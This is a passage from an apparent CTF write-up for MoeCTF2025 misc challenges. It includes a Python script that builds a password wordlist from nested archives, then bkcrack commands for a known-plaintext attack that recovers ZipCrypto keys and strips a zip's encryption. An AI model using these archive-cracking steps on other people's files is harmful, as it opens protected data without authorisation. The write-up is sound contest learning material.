+<h2 id="万里挑一"><a href="#万里挑一" class="headerlink" title="万里挑一"></a><strong>万里挑一</strong></h2><p>压缩包嵌套而且每一个解压后得到的密码都不一样，那就要把这些密码当作一个字典爆破，那就写一个脚本，解压压缩包并提取出里面的数据</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> zipfile</span><br><span class="line"><span class="keyword">import</span> tarfile</span><br><span class="line"><span class="keyword">import</span> gzip</span><br><span class="line"><span class="keyword">import</span> bz2</span><br><span class="line"><span class="keyword">import</span> shutil</span><br><span class="line"><span class="keyword">import</span> chardet</span><br><span class="line"><span class="keyword">from</span> queue <span class="keyword">import</span> Queue</span><br><span class="line"></span><br><span class="line"><span class="comment"># 用于存储所有提取的密码（去重）</span></span><br><span class="line">password_set = <span class="built_in">set</span>()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">detect_encoding</span>(<span class="params">byte_str</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;使用字符编码自动检测&quot;&quot;&quot;</span></span><br><span class="line">    result = chardet.detect(byte_str)</span><br><span class="line">    <span class="keyword">return</span> result[<span class="string">&#x27;encoding&#x27;</span>] <span class="keyword">if</span> result[<span class="string">&#x27;confidence&#x27;</span>] &gt; <span class="number">0.6</span> <span class="keyword">else</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decode_filename</span>(<span class="params">original</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;增强型中文乱码修复&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">isinstance</span>(original, <span class="built_in">str</span>):</span><br><span class="line">            byte_str = original.encode(<span class="string">&#x27;cp437&#x27;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            byte_str = original</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        byte_str = original <span class="keyword">if</span> <span class="built_in">isinstance</span>(original, <span class="built_in">bytes</span>) <span class="keyword">else</span> original.encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    detected_enc = detect_encoding(byte_str)</span><br><span class="line">    <span class="keyword">if</span> detected_enc:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">return</span> byte_str.decode(detected_enc)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> enc <span class="keyword">in</span> [<span class="string">&#x27;gb18030&#x27;</span>, <span class="string">&#x27;gbk&#x27;</span>, <span class="string">&#x27;big5&#x27;</span>, <span class="string">&#x27;utf-8&#x27;</span>, <span class="string">&#x27;shift_jis&#x27;</span>, <span class="string">&#x27;cp437&#x27;</span>]:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">return</span> byte_str.decode(enc)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">return</span> byte_str.decode(<span class="string">&#x27;gb18030&#x27;</span>, errors=<span class="string">&#x27;replace&#x27;</span>)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">str</span>(byte_str)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">extract_password_from_pwdtxt</span>(<span class="params">file_path</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;从pwd.txt中提取密码（格式：The password is:xxxxxx）&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">global</span> password_set</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment"># 读取文件（自动适配编码）</span></span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(file_path, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            content_bytes = f.read()</span><br><span class="line">        encoding = detect_encoding(content_bytes) <span class="keyword">or</span> <span class="string">&#x27;utf-8&#x27;</span></span><br><span class="line">        content = content_bytes.decode(encoding, errors=<span class="string">&#x27;ignore&#x27;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 正则匹配密码格式</span></span><br><span class="line">        <span class="keyword">import</span> re</span><br><span class="line">        <span class="comment"># 匹配 &quot;The password is:xxxxxx&quot;（xxxxxx可为任意字符，直到换行/结束）</span></span><br><span class="line">        pattern = <span class="string">r&#x27;The password is:(.+?)(\n|$)&#x27;</span></span><br><span class="line">        matches = re.findall(pattern, content, re.IGNORECASE)  <span class="comment"># re.IGNORECASE忽略大小写</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># 提取并添加到密码集合（去重）</span></span><br><span class="line">        <span class="keyword">for</span> <span class="keyword">match</span> <span class="keyword">in</span> matches:</span><br><span class="line">            password = <span class="keyword">match</span>[<span class="number">0</span>].strip()  <span class="comment"># 去除前后空格</span></span><br><span class="line">            <span class="keyword">if</span> password:  <span class="comment"># 过滤空密码</span></span><br><span class="line">                password_set.add(password)</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;✅ 从 <span class="subst">&#123;file_path&#125;</span> 提取到密码：<span class="subst">&#123;password&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;❌ 读取 <span class="subst">&#123;file_path&#125;</span> 失败：<span class="subst">&#123;<span class="built_in">str</span>(e)&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_compression_type</span>(<span class="params">filename</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;智能判断压缩类型&quot;&quot;&quot;</span></span><br><span class="line">    filename = filename.lower()</span><br><span class="line">    <span class="keyword">if</span> filename.endswith(<span class="string">&#x27;.zip&#x27;</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;zip&#x27;</span></span><br><span class="line">    <span class="keyword">elif</span> <span class="built_in">any</span>(filename.endswith(ext) <span class="keyword">for</span> ext <span class="keyword">in</span> [<span class="string">&#x27;.tar.gz&#x27;</span>, <span class="string">&#x27;.tgz&#x27;</span>]):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;tar.gz&#x27;</span></span><br><span class="line">    <span class="keyword">elif</span> <span class="built_in">any</span>(filename.endswith(ext) <span class="keyword">for</span> ext <span class="keyword">in</span> [<span class="string">&#x27;.tar.bz2&#x27;</span>, <span class="string">&#x27;.tbz&#x27;</span>]):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;tar.bz2&#x27;</span></span><br><span class="line">    <span class="keyword">elif</span> filename.endswith(<span class="string">&#x27;.tar&#x27;</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;tar&#x27;</span></span><br><span class="line">    <span class="keyword">elif</span> filename.endswith(<span class="string">&#x27;.gz&#x27;</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;gz&#x27;</span></span><br><span class="line">    <span class="keyword">elif</span> filename.endswith(<span class="string">&#x27;.bz2&#x27;</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;bz2&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">repair_zip_filename</span>(<span class="params">zip_info</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;专用ZIP文件名修复&quot;&quot;&quot;</span></span><br><span class="line">    repaired = decode_filename(zip_info.filename)</span><br><span class="line">    <span class="keyword">return</span> repaired.replace(<span class="string">&#x27;\\&#x27;</span>, <span class="string">&#x27;/&#x27;</span>).split(<span class="string">&#x27;/&#x27;</span>)[-<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">safe_extract_zip</span>(<span class="params">file_path, extract_dir</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;增强版ZIP解压&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">with</span> zipfile.ZipFile(file_path, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> zip_ref:</span><br><span class="line">            <span class="keyword">for</span> zip_info <span class="keyword">in</span> zip_ref.infolist():</span><br><span class="line">                <span class="keyword">try</span>:</span><br><span class="line">                    orig_name = repair_zip_filename(zip_info)</span><br><span class="line">                    zip_info.filename = orig_name</span><br><span class="line">                    output_path = os.path.join(extract_dir, orig_name)</span><br><span class="line">                    <span class="keyword">if</span> zip_info.is_dir():</span><br><span class="line">                        os.makedirs(output_path, exist_ok=<span class="literal">True</span>)</span><br><span class="line">                    <span class="keyword">else</span>:</span><br><span class="line">                        os.makedirs(os.path.dirname(output_path), exist_ok=<span class="literal">True</span>)</span><br><span class="line">                        <span class="keyword">with</span> <span class="built_in">open</span>(output_path, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">                            f.write(zip_ref.read(zip_info))</span><br><span class="line">                        <span class="comment"># 如果是pwd.txt，提取密码</span></span><br><span class="line">                        <span class="keyword">if</span> orig_name.lower() == <span class="string">&#x27;pwd.txt&#x27;</span>:</span><br><span class="line">                            extract_password_from_pwdtxt(output_path)</span><br><span class="line">                <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">f&quot;❌ 文件 <span class="subst">&#123;zip_info.filename&#125;</span> 解压失败: <span class="subst">&#123;<span class="built_in">str</span>(e)&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;❌ ZIP解压失败: <span class="subst">&#123;file_path&#125;</span> - <span class="subst">&#123;<span class="built_in">str</span>(e)&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">extract_file</span>(<span class="params">file_path, extract_dir</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;解压处理器（增强中文支持）&quot;&quot;&quot;</span></span><br><span class="line">    filename = os.path.basename(file_path)</span><br><span class="line">    comp_type = get_compression_type(filename)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">if</span> comp_type == <span class="string">&#x27;zip&#x27;</span>:</span><br><span class="line">            <span class="keyword">return</span> safe_extract_zip(file_path, extract_dir)</span><br><span class="line">        <span class="keyword">elif</span> comp_type <span class="keyword">in</span> [<span class="string">&#x27;tar&#x27;</span>, <span class="string">&#x27;tar.gz&#x27;</span>, <span class="string">&#x27;tar.bz2&#x27;</span>]:</span><br><span class="line">            <span class="keyword">if</span> comp_type == <span class="string">&#x27;tar&#x27;</span>:</span><br><span class="line">                mode = <span class="string">&#x27;r&#x27;</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                mode = <span class="string">&#x27;r:&#x27;</span> + comp_type.split(<span class="string">&#x27;.&#x27;</span>)[-<span class="number">1</span>]</span><br><span class="line">            <span class="keyword">with</span> tarfile.<span class="built_in">open</span>(file_path, mode, encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> tar_ref:</span><br><span class="line">                <span class="keyword">for</span> member <span class="keyword">in</span> tar_ref.getmembers():</span><br><span class="line">                    member.name = decode_filename(member.name)</span><br><span class="line">                tar_ref.extractall(extract_dir)</span><br><span class="line">                <span class="comment"># 扫描tar解压后的pwd.txt</span></span><br><span class="line">                <span class="keyword">for</span> root, _, files <span class="keyword">in</span> os.walk(extract_dir):</span><br><span class="line">                    <span class="keyword">for</span> f <span class="keyword">in</span> files:</span><br><span class="line">                        <span class="keyword">if</span> f.lower() == <span class="string">&#x27;pwd.txt&#x27;</span>:</span><br><span class="line">                            extract_password_from_pwdtxt(os.path.join(root, f))</span><br><span class="line">        <span class="keyword">elif</span> comp_type == <span class="string">&#x27;gz&#x27;</span>:</span><br><span class="line">            target_name = decode_filename(filename[:-<span class="number">3</span>])</span><br><span class="line">            target_path = os.path.join(extract_dir, target_name)</span><br><span class="line">            <span class="keyword">with</span> gzip.<span class="built_in">open</span>(file_path, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f_in, <span class="built_in">open</span>(target_path, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f_out:</span><br><span class="line">                shutil.copyfileobj(f_in, f_out)</span><br><span class="line">            <span class="comment"># 如果解压后是pwd.txt，提取密码</span></span><br><span class="line">            <span class="keyword">if</span> target_name.lower() == <span class="string">&#x27;pwd.txt&#x27;</span>:</span><br><span class="line">                extract_password_from_pwdtxt(target_path)</span><br><span class="line">        <span class="keyword">elif</span> comp_type == <span class="string">&#x27;bz2&#x27;</span>:</span><br><span class="line">            target_name = decode_filename(filename[:-<span class="number">4</span>])</span><br><span class="line">            target_path = os.path.join(extract_dir, target_name)</span><br><span class="line">            <span class="keyword">with</span> bz2.<span class="built_in">open</span>(file_path, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f_in, <span class="built_in">open</span>(target_path, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f_out:</span><br><span class="line">                shutil.copyfileobj(f_in, f_out)</span><br><span class="line">            <span class="comment"># 如果解压后是pwd.txt，提取密码</span></span><br><span class="line">            <span class="keyword">if</span> target_name.lower() == <span class="string">&#x27;pwd.txt&#x27;</span>:</span><br><span class="line">                extract_password_from_pwdtxt(target_path)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;❌ 解压失败: <span class="subst">&#123;file_path&#125;</span> - <span class="subst">&#123;<span class="built_in">str</span>(e)&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">process_queue</span>(<span class="params">q</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;队列处理器（递归解压+提取密码）&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">not</span> q.empty():</span><br><span class="line">        file_path = q.get()</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(file_path):</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">        dirpath, filename = os.path.split(file_path)</span><br><span class="line">        comp_type = get_compression_type(filename)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> comp_type <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">            <span class="comment"># 如果不是压缩文件，检查是否是pwd.txt</span></span><br><span class="line">            <span class="keyword">if</span> filename.lower() == <span class="string">&#x27;pwd.txt&#x27;</span>:</span><br><span class="line">                extract_password_from_pwdtxt(file_path)</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># 创建解压目录</span></span><br><span class="line">        base_name = decode_filename(filename.rsplit(<span class="string">&#x27;.&#x27;</span>, <span class="number">1</span>)[<span class="number">0</span>])</span><br><span class="line">        extract_dir = os.path.join(dirpath, base_name)</span><br><span class="line">        os.makedirs(extract_dir, exist_ok=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> extract_file(file_path, extract_dir):</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;✅ 成功解压: <span class="subst">&#123;file_path&#125;</span> -&gt; <span class="subst">&#123;extract_dir&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">            <span class="comment"># 扫描新生成的文件（递归处理压缩包+pwd.txt）</span></span><br><span class="line">            <span class="keyword">for</span> root, _, files <span class="keyword">in</span> os.walk(extract_dir):</span><br><span class="line">                <span class="keyword">for</span> f <span class="keyword">in</span> files:</span><br><span class="line">                    full_path = os.path.join(root, f)</span><br><span class="line">                    <span class="comment"># 检查是否是压缩文件</span></span><br><span class="line">                    <span class="keyword">if</span> get_compression_type(f):</span><br><span class="line">                        q.put(full_path)</span><br><span class="line">                    <span class="comment"># 检查是否是pwd.txt（防止嵌套在文件夹中）</span></span><br><span class="line">                    <span class="keyword">elif</span> f.lower() == <span class="string">&#x27;pwd.txt&#x27;</span>:</span><br><span class="line">                        extract_password_from_pwdtxt(full_path)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">save_password_dict</span>():</span><br><span class="line">    <span class="string">&quot;&quot;&quot;保存所有提取的密码到字典文件&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> password_set:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;❌ 未提取到任何密码！&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 排序后保存（可选，方便查看）</span></span><br><span class="line">    password_list = <span class="built_in">sorted</span>(<span class="built_in">list</span>(password_set))</span><br><span class="line">    dict_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), <span class="string">&#x27;password_dict.txt&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(dict_path, <span class="string">&#x27;w&#x27;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        <span class="keyword">for</span> pwd <span class="keyword">in</span> password_list:</span><br><span class="line">            f.write(pwd + <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;\n🎉 密码提取完成！共提取 <span class="subst">&#123;<span class="built_in">len</span>(password_list)&#125;</span> 个唯一密码&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;📁 字典文件保存路径：<span class="subst">&#123;dict_path&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    <span class="string">&quot;&quot;&quot;主程序&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">import</span> sys</span><br><span class="line">    <span class="comment"># 设置中文环境</span></span><br><span class="line">    os.environ[<span class="string">&#x27;PYTHONUTF8&#x27;</span>] = <span class="string">&quot;1&quot;</span></span><br><span class="line">    <span class="keyword">if</span> os.name == <span class="string">&#x27;nt&#x27;</span>:</span><br><span class="line">        os.environ[<span class="string">&#x27;PYTHONIOENCODING&#x27;</span>] = <span class="string">&quot;utf-8&quot;</span></span><br><span class="line">        os.environ[<span class="string">&#x27;PYTHONLEGACYWINDOWSFSENCODING&#x27;</span>] = <span class="string">&quot;utf-8&quot;</span></span><br><span class="line"></span><br><span class="line">    cur_path = os.path.dirname(os.path.abspath(__file__))</span><br><span class="line">    <span class="comment"># 指定要解压的压缩包（脚本同目录下的password.zip）</span></span><br><span class="line">    input_file = os.path.join(cur_path, <span class="string">&#x27;password.zip&#x27;</span>)</span><br><span class="line">    <span class="comment"># 可选：手动输入压缩包路径</span></span><br><span class="line">    <span class="comment"># input_file = input(&quot;请输入要解压的压缩包路径：&quot;).strip()</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> os.path.isfile(input_file):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;❌ 文件不存在: <span class="subst">&#123;input_file&#125;</span>&quot;</span>)</span><br><span class="line">        sys.exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;🚀 开始处理压缩包：<span class="subst">&#123;input_file&#125;</span>&quot;</span>)</span><br><span class="line">    q = Queue()</span><br><span class="line">    q.put(input_file)</span><br><span class="line">    process_queue(q)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 保存密码字典</span></span><br><span class="line">    save_password_dict()</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;\n✅ 所有操作完成！&quot;</span>)</span><br><span class="line">    <span class="built_in">input</span>(<span class="string">&quot;按任意键退出...&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2026/01/23/MoeCTF2025-WEB-MISC/image-20260124130641622.png" alt="image-20260124130641622"></p>
+<p>一共10000个密码当作字典爆破</p>
+<p><img src="/2026/01/23/MoeCTF2025-WEB-MISC/image-20260124130758324.png" alt="image-20260124130758324"></p>
+<p>然后解压得到一个压缩包，提示的很明显是明文攻击，但是我们没有完整的明文文件，就可以从exe文件下手</p>
+<p><img src="/2026/01/23/MoeCTF2025-WEB-MISC/image-20260124190949929.png" alt="image-20260124190949929"></p>
+<p>构造一个bin文件</p>
+<p><img src="/2026/01/23/MoeCTF2025-WEB-MISC/image-20260124192226655.png" alt="image-20260124192226655"></p>
+<p>然后爆破</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bkcrack.exe -C flag.zip -c &quot;明文.exe&quot; -p 1.bin</span><br></pre></td></tr></table></figure>
+
+<p>爆破得到的是密钥不是密码，要用密钥生成一个没有密码的新 ZIP 文件</p>
+<p><img src="/2026/01/23/MoeCTF2025-WEB-MISC/image-20260124190918500.png" alt="image-20260124190918500"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bkcrack.exe -C flag.zip -k eec878a3 6808e48f 3aa41bd8 -D 2.zip</span><br></pre></td></tr></table></figure>
+
+<p>得到没有加密的压缩包，</p>
+<p><img src="/2026/01/23/MoeCTF2025-WEB-MISC/image-20260124193018258.png" alt="image-20260124193018258"></p>
+<p>moectf{Y0u_h4v3_cho5en_7h3_r1ght_z1pf1le!!uysdgfsad}</p>
+<h2 id="Encrypted-volume"><a href="#Encrypted-volume" class="headerlink" title="Encrypted volume"></a><strong>Encrypted volume</strong></h2><p>解压压缩包得到一个0kb的文件还有一个加密容器，刚开始以为文件名就是密码，发现不对，然后随波逐流分析压缩包发现有隐藏图片</p>
+<p><img src="/2026/01/23/MoeCTF2025-WEB-MISC/00002048.png" alt="00002048"></p>
+<p>容器里文件内容</p>
